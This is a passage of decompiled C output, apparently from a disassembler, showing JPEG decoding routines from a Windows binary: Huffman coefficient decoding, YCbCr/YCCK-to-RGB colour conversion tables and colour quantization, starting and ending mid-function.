              pbVar10 = local_28;
              pbVar12 = local_2c;
              if (7 < (int)local_28) goto LAB_00425e99;
              local_44 = 1;
LAB_00425ed2:
              uVar8 = FUN_004259e8(&local_34,pbVar12,pbVar10,local_44,iVar3);
              pbVar10 = local_28;
              pbVar12 = local_2c;
              if ((int)uVar8 < 0) {
                return 0;
              }
            }
            else {
LAB_00425e99:
              uVar8 = (int)pbVar12 >> ((char)pbVar10 - 8U & 0x1f) & 0xff;
              iVar7 = *(int *)(iVar3 + 0x90 + uVar8 * 4);
              if (iVar7 == 0) {
                local_44 = 9;
                goto LAB_00425ed2;
              }
              uVar8 = (uint)*(byte *)(iVar3 + 0x490 + uVar8);
              pbVar10 = pbVar10 + -iVar7;
            }
            uVar9 = uVar8 & 0xf;
            if (uVar9 == 0) {
              if ((int)uVar8 >> 4 != 0xf) break;
              iVar5 = iVar5 + 0xf;
            }
            else {
              iVar5 = iVar5 + ((int)uVar8 >> 4);
              if (((int)pbVar10 < (int)uVar9) &&
                 (iVar7 = FUN_0042589c(&local_34,pbVar12,pbVar10,uVar9), pbVar10 = local_28,
                 pbVar12 = local_2c, iVar7 == 0)) {
                return 0;
              }
              pbVar10 = pbVar10 + -uVar9;
            }
            iVar5 = iVar5 + 1;
          } while (iVar5 < 0x40);
        }
        else {
          iVar5 = 1;
          do {
            if ((int)pbVar10 < 8) {
              iVar7 = FUN_0042589c(&local_34,pbVar12,pbVar10,0);
              if (iVar7 == 0) {
                return 0;
              }
              pbVar10 = local_28;
              pbVar12 = local_2c;
              if (7 < (int)local_28) goto LAB_00425d6e;
              local_48 = 1;
LAB_00425da7:
              uVar8 = FUN_004259e8(&local_34,pbVar12,pbVar10,local_48,iVar3);
              pbVar10 = local_28;
              pbVar12 = local_2c;
              if ((int)uVar8 < 0) {
                return 0;
              }
            }
            else {
LAB_00425d6e:
              uVar8 = (int)pbVar12 >> ((char)pbVar10 - 8U & 0x1f) & 0xff;
              iVar7 = *(int *)(iVar3 + 0x90 + uVar8 * 4);
              if (iVar7 == 0) {
                local_48 = 9;
                goto LAB_00425da7;
              }
              uVar8 = (uint)*(byte *)(iVar3 + 0x490 + uVar8);
              pbVar10 = pbVar10 + -iVar7;
            }
            uVar9 = uVar8 & 0xf;
            if (uVar9 == 0) {
              if ((int)uVar8 >> 4 != 0xf) break;
              iVar5 = iVar5 + 0xf;
            }
            else {
              iVar5 = iVar5 + ((int)uVar8 >> 4);
              if (((int)pbVar10 < (int)uVar9) &&
                 (iVar7 = FUN_0042589c(&local_34,pbVar12,pbVar10,uVar9), pbVar10 = local_28,
                 pbVar12 = local_2c, iVar7 == 0)) {
                return 0;
              }
              pbVar10 = pbVar10 + -uVar9;
              uVar8 = (int)pbVar12 >> ((byte)pbVar10 & 0x1f) & (1 << (sbyte)uVar9) - 1U;
              if ((int)uVar8 < *(int *)(&DAT_00440b5c + uVar9 * 4)) {
                uVar8 = *(int *)(&DAT_00440b9c + uVar9 * 4) + uVar8;
              }
              puVar2[(&DAT_00440da8)[iVar5]] = (short)uVar8;
            }
            iVar5 = iVar5 + 1;
          } while (iVar5 < 0x40);
        }
        local_38 = local_38 + 1;
        local_3c = local_3c + 1;
        local_40 = local_40 + 1;
      }
      ppbVar4 = *(byte ***)(param_1 + 0x18);
      *ppbVar4 = local_34;
      ppbVar4[1] = local_30;
      *(byte **)(iVar1 + 0xc) = pbVar12;
      *(byte **)(iVar1 + 0x10) = pbVar10;
      piVar11 = local_20;
      piVar13 = (int *)(iVar1 + 0x14);
      for (iVar5 = 4; iVar5 != 0; iVar5 = iVar5 + -1) {
        *piVar13 = *piVar11;
        piVar11 = piVar11 + (uint)bVar14 * -2 + 1;
        piVar13 = piVar13 + (uint)bVar14 * -2 + 1;
      }
    }
    *(int *)(iVar1 + 0x24) = *(int *)(iVar1 + 0x24) + -1;
    uVar6 = 1;
  }
  else {
    uVar6 = 0;
  }
  return uVar6;
}



void FUN_00425fb4(int param_1)

{
  code **ppcVar1;
  int iVar2;
  
  ppcVar1 = (code **)(***(code ***)(param_1 + 4))(param_1,1,0xe8);
  *(code ***)(param_1 + 0x1bc) = ppcVar1;
  *ppcVar1 = FUN_00425468;
  ppcVar1[1] = FUN_00425b50;
  iVar2 = 0;
  ppcVar1 = ppcVar1 + 0xe;
  do {
    *ppcVar1 = (code *)0x0;
    ppcVar1[-4] = (code *)0x0;
    iVar2 = iVar2 + 1;
    ppcVar1 = ppcVar1 + 1;
  } while (iVar2 < 4);
  return;
}



void FUN_00425ff4(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar1 = *(int *)(param_1 + 0x1c4);
  uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x400);
  *(undefined4 *)(iVar1 + 0x10) = uVar2;
  uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x400);
  *(undefined4 *)(iVar1 + 0x14) = uVar2;
  uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x400);
  *(undefined4 *)(iVar1 + 0x18) = uVar2;
  uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x400);
  *(undefined4 *)(iVar1 + 0x1c) = uVar2;
  iVar3 = 0;
  iVar5 = -0x80;
  do {
    *(int *)(*(int *)(iVar1 + 0x10) + iVar3 * 4) = iVar5 * 0x166e9 + 0x8000 >> 0x10;
    *(int *)(*(int *)(iVar1 + 0x14) + iVar3 * 4) = iVar5 * 0x1c5a2 + 0x8000 >> 0x10;
    *(int *)(*(int *)(iVar1 + 0x18) + iVar3 * 4) = iVar5 * -0xb6d2;
    iVar4 = iVar5 * -0x581a;
    iVar5 = iVar5 + 1;
    *(int *)(*(int *)(iVar1 + 0x1c) + iVar3 * 4) = iVar4 + 0x8000;
    iVar3 = iVar3 + 1;
  } while (iVar3 < 0x100);
  return;
}



void FUN_004260c0(int param_1,undefined4 param_2,int *param_3,int param_4,int *param_5,int param_6)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  undefined4 local_18;
  undefined4 local_14;
  int *local_10;
  undefined4 local_c;
  int local_8;
  
  iVar1 = *(int *)(param_1 + 0x1c4);
  local_10 = param_3;
  local_c = param_2;
  local_8 = param_1;
  if (*(int *)(iVar1 + 0x24) == 0) {
    uVar3 = 2;
    if (*(uint *)(iVar1 + 0x2c) < 2) {
      uVar3 = *(uint *)(iVar1 + 0x2c);
    }
    iVar2 = *param_5;
    if ((uint)(param_4 - iVar2) < uVar3) {
      uVar3 = param_4 - iVar2;
    }
    local_18 = *(undefined4 *)(param_6 + iVar2 * 4);
    if (uVar3 < 2) {
      local_14 = *(undefined4 *)(iVar1 + 0x20);
      *(undefined4 *)(iVar1 + 0x24) = 1;
    }
    else {
      local_14 = *(undefined4 *)(param_6 + 4 + iVar2 * 4);
    }
    (**(code **)(iVar1 + 0xc))(param_1,param_2,*param_3,&local_18);
  }
  else {
    FUN_0042dbd0((char)iVar1 + ' ',0,(char)(*param_5 << 2) + (char)param_6,
                 *(undefined4 *)(iVar1 + 0x28),1,0);
    uVar3 = 1;
    *(undefined4 *)(iVar1 + 0x24) = 0;
  }
  *param_5 = *param_5 + uVar3;
  *(int *)(iVar1 + 0x2c) = *(int *)(iVar1 + 0x2c) - uVar3;
  if (*(int *)(iVar1 + 0x24) == 0) {
    *local_10 = *local_10 + 1;
  }
  return;
}



void FUN_004261b0(int param_1,int *param_2,int param_3,undefined4 *param_4)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  byte *pbVar8;
  byte *pbVar9;
  byte *pbVar10;
  int iVar11;
  int iVar12;
  uint uVar13;
  uint uVar14;
  undefined *puVar15;
  int iVar16;
  
  iVar3 = *(int *)(param_1 + 0x1c4);
  iVar4 = *(int *)(iVar3 + 0x10);
  iVar5 = *(int *)(param_1 + 0x144);
  iVar6 = *(int *)(iVar3 + 0x14);
  iVar7 = *(int *)(iVar3 + 0x18);
  iVar3 = *(int *)(iVar3 + 0x1c);
  pbVar8 = *(byte **)(*param_2 + param_3 * 4);
  pbVar9 = *(byte **)(param_2[1] + param_3 * 4);
  pbVar10 = *(byte **)(param_2[2] + param_3 * 4);
  puVar15 = (undefined *)*param_4;
  for (uVar13 = *(uint *)(param_1 + 0x70) >> 1; uVar13 != 0; uVar13 = uVar13 - 1) {
    bVar1 = *pbVar9;
    pbVar9 = pbVar9 + 1;
    bVar2 = *pbVar10;
    pbVar10 = pbVar10 + 1;
    iVar11 = *(int *)(iVar4 + (uint)bVar2 * 4);
    iVar16 = *(int *)(iVar3 + (uint)bVar1 * 4) + *(int *)(iVar7 + (uint)bVar2 * 4) >> 0x10;
    iVar12 = *(int *)(iVar6 + (uint)bVar1 * 4);
    uVar14 = (uint)*pbVar8;
    puVar15[2] = *(undefined *)(iVar5 + uVar14 + iVar11);
    puVar15[1] = *(undefined *)(iVar5 + uVar14 + iVar16);
    *puVar15 = *(undefined *)(iVar5 + uVar14 + iVar12);
    uVar14 = (uint)pbVar8[1];
    pbVar8 = pbVar8 + 2;
    puVar15[5] = *(undefined *)(iVar5 + uVar14 + iVar11);
    puVar15[4] = *(undefined *)(iVar5 + uVar14 + iVar16);
    puVar15[3] = *(undefined *)(iVar5 + uVar14 + iVar12);
    puVar15 = puVar15 + 6;
  }
  if ((*(byte *)(param_1 + 0x70) & 1) != 0) {
    iVar3 = *(int *)(iVar3 + (uint)*pbVar9 * 4);
    iVar7 = *(int *)(iVar7 + (uint)*pbVar10 * 4);
    iVar6 = *(int *)(iVar6 + (uint)*pbVar9 * 4);
    uVar13 = (uint)*pbVar8;
    puVar15[2] = *(undefined *)(iVar5 + uVar13 + *(int *)(iVar4 + (uint)*pbVar10 * 4));
    puVar15[1] = *(undefined *)(iVar5 + uVar13 + (iVar3 + iVar7 >> 0x10));
    *puVar15 = *(undefined *)(iVar5 + uVar13 + iVar6);
  }
  return;
}



void FUN_00426328(int param_1,int *param_2,int param_3,undefined4 *param_4)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  byte *pbVar7;
  byte *pbVar8;
  byte *pbVar9;
  byte *pbVar10;
  undefined *puVar11;
  int iVar12;
  int iVar13;
  undefined *puVar14;
  uint uVar15;
  uint uVar16;
  int iVar17;
  int iVar18;
  
  iVar3 = *(int *)(param_1 + 0x1c4);
  iVar4 = *(int *)(param_1 + 0x144);
  iVar5 = *(int *)(iVar3 + 0x10);
  iVar6 = *(int *)(iVar3 + 0x14);
  iVar18 = *(int *)(iVar3 + 0x18);
  iVar3 = *(int *)(iVar3 + 0x1c);
  pbVar7 = *(byte **)(*param_2 + param_3 * 8);
  pbVar8 = *(byte **)(*param_2 + 4 + param_3 * 8);
  pbVar9 = *(byte **)(param_2[1] + param_3 * 4);
  pbVar10 = *(byte **)(param_2[2] + param_3 * 4);
  puVar14 = (undefined *)*param_4;
  puVar11 = (undefined *)param_4[1];
  for (uVar15 = *(uint *)(param_1 + 0x70) >> 1; uVar15 != 0; uVar15 = uVar15 - 1) {
    bVar1 = *pbVar9;
    pbVar9 = pbVar9 + 1;
    bVar2 = *pbVar10;
    pbVar10 = pbVar10 + 1;
    iVar12 = *(int *)(iVar5 + (uint)bVar2 * 4);
    iVar17 = *(int *)(iVar3 + (uint)bVar1 * 4) + *(int *)(iVar18 + (uint)bVar2 * 4) >> 0x10;
    iVar13 = *(int *)(iVar6 + (uint)bVar1 * 4);
    uVar16 = (uint)*pbVar7;
    puVar14[2] = *(undefined *)(iVar4 + uVar16 + iVar12);
    puVar14[1] = *(undefined *)(iVar4 + uVar16 + iVar17);
    *puVar14 = *(undefined *)(iVar4 + uVar16 + iVar13);
    uVar16 = (uint)pbVar7[1];
    pbVar7 = pbVar7 + 2;
    puVar14[5] = *(undefined *)(iVar4 + uVar16 + iVar12);
    puVar14[4] = *(undefined *)(iVar4 + uVar16 + iVar17);
    puVar14[3] = *(undefined *)(iVar4 + uVar16 + iVar13);
    puVar14 = puVar14 + 6;
    uVar16 = (uint)*pbVar8;
    puVar11[2] = *(undefined *)(iVar4 + uVar16 + iVar12);
    puVar11[1] = *(undefined *)(iVar4 + uVar16 + iVar17);
    *puVar11 = *(undefined *)(iVar4 + uVar16 + iVar13);
    uVar16 = (uint)pbVar8[1];
    pbVar8 = pbVar8 + 2;
    puVar11[5] = *(undefined *)(iVar4 + uVar16 + iVar12);
    puVar11[4] = *(undefined *)(iVar4 + uVar16 + iVar17);
    puVar11[3] = *(undefined *)(iVar4 + uVar16 + iVar13);
    puVar11 = puVar11 + 6;
  }
  if ((*(byte *)(param_1 + 0x70) & 1) != 0) {
    iVar5 = *(int *)(iVar5 + (uint)*pbVar10 * 4);
    iVar18 = *(int *)(iVar3 + (uint)*pbVar9 * 4) + *(int *)(iVar18 + (uint)*pbVar10 * 4) >> 0x10;
    iVar3 = *(int *)(iVar6 + (uint)*pbVar9 * 4);
    uVar15 = (uint)*pbVar7;
    puVar14[2] = *(undefined *)(iVar4 + uVar15 + iVar5);
    puVar14[1] = *(undefined *)(iVar4 + uVar15 + iVar18);
    *puVar14 = *(undefined *)(iVar4 + uVar15 + iVar3);
    uVar15 = (uint)*pbVar8;
    puVar11[2] = *(undefined *)(iVar4 + uVar15 + iVar5);
    puVar11[1] = *(undefined *)(iVar4 + uVar15 + iVar18);
    *puVar11 = *(undefined *)(iVar4 + uVar15 + iVar3);
  }
  return;
}



void FUN_00426560(int param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  
  puVar1 = (undefined4 *)(***(code ***)(param_1 + 4))(param_1,1,0x30);
  *(undefined4 **)(param_1 + 0x1c4) = puVar1;
  *puVar1 = &LAB_004260ac;
  puVar1[2] = 0;
  puVar1[10] = *(int *)(param_1 + 0x70) * *(int *)(param_1 + 0x78);
  if (*(int *)(param_1 + 0x138) == 2) {
    puVar1[1] = FUN_004260c0;
    puVar1[3] = FUN_00426328;
    uVar2 = (**(code **)(*(int *)(param_1 + 4) + 4))(param_1,1,puVar1[10]);
    puVar1[8] = uVar2;
  }
  else {
    puVar1[1] = &LAB_00426178;
    puVar1[3] = FUN_004261b0;
    puVar1[8] = 0;
  }
  FUN_00425ff4(param_1);
  return;
}



void FUN_004265e0(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  
  iVar1 = *(int *)(param_1 + 0x1c8);
  uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x400);
  *(undefined4 *)(iVar1 + 8) = uVar2;
  uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x400);
  *(undefined4 *)(iVar1 + 0xc) = uVar2;
  uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x400);
  *(undefined4 *)(iVar1 + 0x10) = uVar2;
  uVar2 = (***(code ***)(param_1 + 4))(param_1,1,0x400);
  *(undefined4 *)(iVar1 + 0x14) = uVar2;
  iVar3 = 0;
  iVar5 = -0x80;
  do {
    *(int *)(*(int *)(iVar1 + 8) + iVar3 * 4) = iVar5 * 0x166e9 + 0x8000 >> 0x10;
    *(int *)(*(int *)(iVar1 + 0xc) + iVar3 * 4) = iVar5 * 0x1c5a2 + 0x8000 >> 0x10;
    *(int *)(*(int *)(iVar1 + 0x10) + iVar3 * 4) = iVar5 * -0xb6d2;
    iVar4 = iVar5 * -0x581a;
    iVar5 = iVar5 + 1;
    *(int *)(*(int *)(iVar1 + 0x14) + iVar3 * 4) = iVar4 + 0x8000;
    iVar3 = iVar3 + 1;
  } while (iVar3 < 0x100);
  return;
}



void FUN_00426698(int param_1,int *param_2,int param_3,int param_4,undefined4 *param_5)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  undefined *puVar9;
  uint uVar10;
  byte *local_38;
  byte *local_34;
  byte *local_30;
  uint local_18;
  int local_c;
  
  iVar3 = *(int *)(param_1 + 0x1c8);
  uVar4 = *(uint *)(param_1 + 0x70);
  iVar5 = *(int *)(param_1 + 0x144);
  iVar6 = *(int *)(iVar3 + 8);
  iVar7 = *(int *)(iVar3 + 0xc);
  iVar8 = *(int *)(iVar3 + 0x10);
  iVar3 = *(int *)(iVar3 + 0x14);
  local_c = param_3;
  while( true ) {
    param_4 = param_4 + -1;
    if (param_4 < 0) break;
    local_30 = *(byte **)(*param_2 + local_c * 4);
    local_34 = *(byte **)(param_2[1] + local_c * 4);
    local_38 = *(byte **)(param_2[2] + local_c * 4);
    local_c = local_c + 1;
    puVar9 = (undefined *)*param_5;
    param_5 = param_5 + 1;
    local_18 = 0;
    if (uVar4 != 0) {
      do {
        uVar10 = (uint)*local_30;
        bVar1 = *local_34;
        bVar2 = *local_38;
        puVar9[2] = *(undefined *)(iVar5 + uVar10 + *(int *)(iVar6 + (uint)bVar2 * 4));
        puVar9[1] = *(undefined *)
                     (iVar5 + uVar10 +
                     (*(int *)(iVar3 + (uint)bVar1 * 4) + *(int *)(iVar8 + (uint)bVar2 * 4) >> 0x10)
                     );
        *puVar9 = *(undefined *)(iVar5 + uVar10 + *(int *)(iVar7 + (uint)bVar1 * 4));
        puVar9 = puVar9 + 3;
        local_18 = local_18 + 1;
        local_38 = local_38 + 1;
        local_34 = local_34 + 1;
        local_30 = local_30 + 1;
      } while (local_18 < uVar4);
    }
  }
  return;
}



void FUN_004267a0(int param_1,int *param_2,int param_3,int param_4,int *param_5)

{
  int iVar1;
  int iVar2;
  undefined *puVar3;
  undefined *puVar4;
  int iVar5;
  int *local_14;
  int local_10;
  
  iVar1 = *(int *)(param_1 + 0x24);
  iVar2 = *(int *)(param_1 + 0x70);
  while (param_4 = param_4 + -1, -1 < param_4) {
    local_10 = 0;
    local_14 = param_2;
    if (0 < iVar1) {
      do {
        puVar4 = (undefined *)(*param_5 + local_10);
        puVar3 = *(undefined **)(*local_14 + param_3 * 4);
        for (iVar5 = iVar2; iVar5 != 0; iVar5 = iVar5 + -1) {
          *puVar4 = *puVar3;
          puVar3 = puVar3 + 1;
          puVar4 = puVar4 + iVar1;
        }
        local_10 = local_10 + 1;
        local_14 = local_14 + 1;
      } while (local_10 < iVar1);
    }
    param_3 = param_3 + 1;
    param_5 = param_5 + 1;
  }
  return;
}



void FUN_00426810(undefined param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 undefined4 param_5)

{
  undefined3 in_register_00000001;
  undefined3 in_register_00000009;
  
  FUN_0042dbd0((char)*(undefined4 *)CONCAT31(in_register_00000009,param_2),param_3,
               (undefined)param_5,*(undefined4 *)(CONCAT31(in_register_00000001,param_1) + 0x70),
               param_4,0);
  return;
}



void FUN_00426830(int param_1,int *param_2,int param_3,int param_4,undefined4 *param_5)

{
  undefined uVar1;
  uint uVar2;
  undefined *puVar3;
  undefined *puVar4;
  uint uVar5;
  
  uVar2 = *(uint *)(param_1 + 0x70);
  while( true ) {
    param_4 = param_4 + -1;
    if (param_4 < 0) break;
    uVar5 = 0;
    puVar4 = *(undefined **)(*param_2 + param_3 * 4);
    param_3 = param_3 + 1;
    puVar3 = (undefined *)*param_5;
    param_5 = param_5 + 1;
    if (uVar2 != 0) {
      do {
        uVar1 = *puVar4;
        *puVar3 = uVar1;
        puVar3[1] = uVar1;
        puVar3[2] = uVar1;
        puVar3 = puVar3 + 3;
        uVar5 = uVar5 + 1;
        puVar4 = puVar4 + 1;
      } while (uVar5 < uVar2);
    }
  }
  return;
}



void FUN_00426878(int param_1,int *param_2,int param_3,int param_4,undefined4 *param_5)

{
  byte bVar1;
  byte bVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  undefined *puVar9;
  uint uVar10;
  undefined *local_40;
  byte *local_3c;
  byte *local_38;
  byte *local_34;
  uint local_1c;
  int local_c;
  
  iVar3 = *(int *)(param_1 + 0x1c8);
  uVar4 = *(uint *)(param_1 + 0x70);
  iVar5 = *(int *)(param_1 + 0x144);
  iVar6 = *(int *)(iVar3 + 8);
  iVar7 = *(int *)(iVar3 + 0xc);
  iVar8 = *(int *)(iVar3 + 0x10);
  iVar3 = *(int *)(iVar3 + 0x14);
  local_c = param_3;
  while( true ) {
    param_4 = param_4 + -1;
    if (param_4 < 0) break;
    local_34 = *(byte **)(*param_2 + local_c * 4);
    local_38 = *(byte **)(param_2[1] + local_c * 4);
    local_3c = *(byte **)(param_2[2] + local_c * 4);
    local_40 = *(undefined **)(param_2[3] + local_c * 4);
    local_c = local_c + 1;
    puVar9 = (undefined *)*param_5;
    param_5 = param_5 + 1;
    local_1c = 0;
    if (uVar4 != 0) {
      do {
        uVar10 = (uint)*local_34;
        bVar1 = *local_38;
        bVar2 = *local_3c;
        *puVar9 = *(undefined *)(iVar5 + (0xff - (*(int *)(iVar6 + (uint)bVar2 * 4) + uVar10)));
        puVar9[1] = *(undefined *)
                     (iVar5 + (0xff - ((*(int *)(iVar3 + (uint)bVar1 * 4) +
                                        *(int *)(iVar8 + (uint)bVar2 * 4) >> 0x10) + uVar10)));
        puVar9[2] = *(undefined *)(iVar5 + (0xff - (uVar10 + *(int *)(iVar7 + (uint)bVar1 * 4))));
        puVar9[3] = *local_40;
        puVar9 = puVar9 + 4;
        local_1c = local_1c + 1;
        local_40 = local_40 + 1;
        local_3c = local_3c + 1;
        local_38 = local_38 + 1;
        local_34 = local_34 + 1;
      } while (local_1c < uVar4);
    }
  }
  return;
}



uint FUN_004269bc(int *param_1)

{
  int iVar1;
  undefined4 *puVar2;
  uint uVar3;
  bool bVar4;
  
  puVar2 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x18);
  param_1[0x72] = (int)puVar2;
  *puVar2 = &DAT_004269b8;
  iVar1 = param_1[10];
  uVar3 = iVar1 - 1;
  if (uVar3 == 0) {
    if (param_1[9] != 1) {
      *(undefined4 *)(*param_1 + 0x14) = 10;
      uVar3 = (**(code **)*param_1)();
    }
  }
  else {
    uVar3 = iVar1 - 4;
    if (iVar1 - 2U < 2) {
      if (param_1[9] != 3) {
        *(undefined4 *)(*param_1 + 0x14) = 10;
        uVar3 = (**(code **)*param_1)();
      }
    }
    else {
      bVar4 = uVar3 < 2;
      uVar3 = iVar1 - 6;
      if (bVar4) {
        if (param_1[9] != 4) {
          *(undefined4 *)(*param_1 + 0x14) = 10;
          uVar3 = (**(code **)*param_1)();
        }
      }
      else if (param_1[9] < 1) {
        *(undefined4 *)(*param_1 + 0x14) = 10;
        uVar3 = (**(code **)*param_1)();
      }
    }
  }
  iVar1 = param_1[0xb];
  if (iVar1 == 1) {
    param_1[0x1e] = 1;
    if ((param_1[10] == 1) || (param_1[10] == 3)) {
      puVar2[1] = FUN_00426810;
      for (uVar3 = 1; (int)uVar3 < param_1[9]; uVar3 = uVar3 + 1) {
        *(undefined4 *)(param_1[0x36] + 0x30 + uVar3 * 0x54) = 0;
      }
    }
    else {
      *(undefined4 *)(*param_1 + 0x14) = 0x1b;
      uVar3 = (**(code **)*param_1)();
    }
  }
  else if (iVar1 == 2) {
    param_1[0x1e] = 3;
    if (param_1[10] == 3) {
      puVar2[1] = FUN_00426698;
      uVar3 = FUN_004265e0((int)param_1);
    }
    else if (param_1[10] == 1) {
      puVar2[1] = FUN_00426830;
    }
    else if (param_1[10] == 2) {
      puVar2[1] = FUN_004267a0;
    }
    else {
      *(undefined4 *)(*param_1 + 0x14) = 0x1b;
      uVar3 = (**(code **)*param_1)();
    }
  }
  else if (iVar1 == 4) {
    param_1[0x1e] = 4;
    if (param_1[10] == 5) {
      puVar2[1] = FUN_00426878;
      uVar3 = FUN_004265e0((int)param_1);
    }
    else if (param_1[10] == 4) {
      puVar2[1] = FUN_004267a0;
    }
    else {
      *(undefined4 *)(*param_1 + 0x14) = 0x1b;
      uVar3 = (**(code **)*param_1)();
    }
  }
  else if (param_1[0xb] == param_1[10]) {
    uVar3 = param_1[9];
    param_1[0x1e] = uVar3;
    puVar2[1] = FUN_004267a0;
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 0x1b;
    uVar3 = (**(code **)*param_1)();
  }
  if (param_1[0x15] == 0) {
    param_1[0x1f] = param_1[0x1e];
    return uVar3;
  }
  param_1[0x1f] = 1;
  return uVar3;
}



int FUN_00426b88(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  bool bVar3;
  int iVar4;
  int *piVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int *local_10;
  
  iVar1 = param_1[0x1e];
  iVar2 = param_1[0x18];
  iVar8 = 1;
  do {
    iVar6 = iVar8;
    iVar8 = iVar6 + 1;
    iVar7 = 1;
    iVar4 = iVar8;
    if (1 < iVar1) {
      do {
        iVar4 = iVar4 * iVar8;
        iVar7 = iVar7 + 1;
      } while (iVar7 < iVar1);
    }
  } while (iVar4 <= iVar2);
  if (iVar6 < 2) {
    iVar8 = *param_1;
    *(undefined4 *)(iVar8 + 0x14) = 0x38;
    *(int *)(iVar8 + 0x18) = iVar4;
    (**(code **)*param_1)();
  }
  iVar8 = 1;
  iVar4 = 0;
  piVar5 = param_2;
  if (0 < iVar1) {
    do {
      *piVar5 = iVar6;
      iVar8 = iVar8 * iVar6;
      iVar4 = iVar4 + 1;
      piVar5 = piVar5 + 1;
    } while (iVar4 < iVar1);
  }
  do {
    bVar3 = false;
    iVar4 = 0;
    local_10 = &DAT_00440cdc;
    if (0 < iVar1) {
      do {
        iVar7 = iVar4;
        if (param_1[0xb] == 2) {
          iVar7 = *local_10;
        }
        iVar6 = (iVar8 / param_2[iVar7]) * (param_2[iVar7] + 1);
        if (iVar6 - iVar2 != 0 && iVar2 <= iVar6) break;
        iVar4 = iVar4 + 1;
        param_2[iVar7] = param_2[iVar7] + 1;
        bVar3 = true;
        local_10 = local_10 + 1;
        iVar8 = iVar6;
      } while (iVar4 < iVar1);
    }
    if (!bVar3) {
      return iVar8;
    }
  } while( true );
}



int FUN_00426c80(undefined4 param_1,undefined4 param_2,int param_3,uint param_4)

{
  int iVar1;
  
  iVar1 = (int)param_4 >> 1;
  if (iVar1 < 0) {
    iVar1 = iVar1 + (uint)((param_4 & 1) != 0);
  }
  return (param_3 * 0xff + iVar1) / (int)param_4;
}



int FUN_00426ca4(undefined4 param_1,undefined4 param_2,int param_3,int param_4)

{
  return (param_3 * 0x1fe + param_4 + 0xff) / (param_4 * 2);
}



void FUN_00426cc8(int *param_1)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  int iVar5;
  int iVar6;
  int iVar7;
  undefined *puVar8;
  int iStack56;
  int local_34;
  int iStack48;
  int iStack40;
  int *piStack36;
  int *piStack24;
  
  iVar1 = param_1[0x73];
  iVar2 = FUN_00426b88(param_1,(int *)(iVar1 + 0x20));
  if (param_1[0x1e] == 3) {
    iVar4 = *param_1;
    *(int *)(iVar4 + 0x18) = iVar2;
    *(undefined4 *)(iVar4 + 0x1c) = *(undefined4 *)(iVar1 + 0x20);
    *(undefined4 *)(iVar4 + 0x20) = *(undefined4 *)(iVar1 + 0x24);
    *(undefined4 *)(iVar4 + 0x24) = *(undefined4 *)(iVar1 + 0x28);
    *(undefined4 *)(*param_1 + 0x14) = 0x5e;
    (**(code **)(*param_1 + 4))(param_1,1);
  }
  else {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x5f;
    *(int *)(iVar1 + 0x18) = iVar2;
    (**(code **)(*param_1 + 4))(param_1,1);
  }
  iVar1 = param_1[0x1e];
  piVar3 = (int *)(**(code **)(param_1[1] + 8))(param_1,1,iVar2);
  iStack40 = iStack56;
  piStack36 = param_1 + 8;
  piStack24 = piVar3;
  for (local_34 = 0; local_34 < *(int *)(iVar1 + 0x78); local_34 = local_34 + 1) {
    iVar2 = *piStack36;
    iVar4 = iStack40 / iVar2;
    iStack48 = 0;
    if (0 < iVar2) {
      do {
        iVar5 = FUN_00426c80(iVar1,local_34,iStack48,iVar2 - 1);
        for (iVar7 = iStack48 * iVar4; iVar7 < iStack56; iVar7 = iVar7 + iStack40) {
          iVar6 = 0;
          if (0 < iVar4) {
            do {
              puVar8 = (undefined *)(*piStack24 + iVar7 + iVar6);
              iVar6 = iVar6 + 1;
              *puVar8 = (char)iVar5;
            } while (iVar6 < iVar4);
          }
        }
        iStack48 = iStack48 + 1;
      } while (iStack48 < iVar2);
    }
    piStack24 = piStack24 + 1;
    piStack36 = piStack36 + 1;
    iStack40 = iVar4;
  }
  param_1[4] = (int)piVar3;
  param_1[5] = iStack56;
  return;
}



void FUN_00426e7c(int param_1)

{
  int *piVar1;
  int iVar2;
  char *pcVar3;
  undefined4 uVar4;
  int iVar5;
  char *pcVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  int iVar10;
  int iStack32;
  int iStack28;
  int *local_18;
  char *pcStack20;
  
  if (*(int *)(param_1 + 0x58) == 1) {
    local_18 = (int *)0x1fe;
    *(undefined4 *)(*(int *)(param_1 + 0x1cc) + 0x1c) = 1;
  }
  else {
    local_18 = (int *)0x0;
    *(undefined4 *)(*(int *)(param_1 + 0x1cc) + 0x1c) = 0;
  }
  iVar2 = *(int *)(param_1 + 0x78);
  uVar4 = (**(code **)(*(int *)(param_1 + 4) + 8))(param_1,1,(int)local_18 + 0x100);
  *(undefined4 *)(param_1 + 0x18) = uVar4;
  iStack32 = *(int *)(param_1 + 0x14);
  local_18 = (int *)(param_1 + 0x20);
  for (iVar10 = 0; iVar10 < *(int *)(iVar2 + 0x78); iVar10 = iVar10 + 1) {
    iVar8 = *local_18;
    iStack32 = iStack32 / iVar8;
    if (iStack28 != 0) {
      piVar1 = (int *)(*(int *)(param_1 + 0x18) + iVar10 * 4);
      *piVar1 = *piVar1 + 0xff;
    }
    iVar9 = 0;
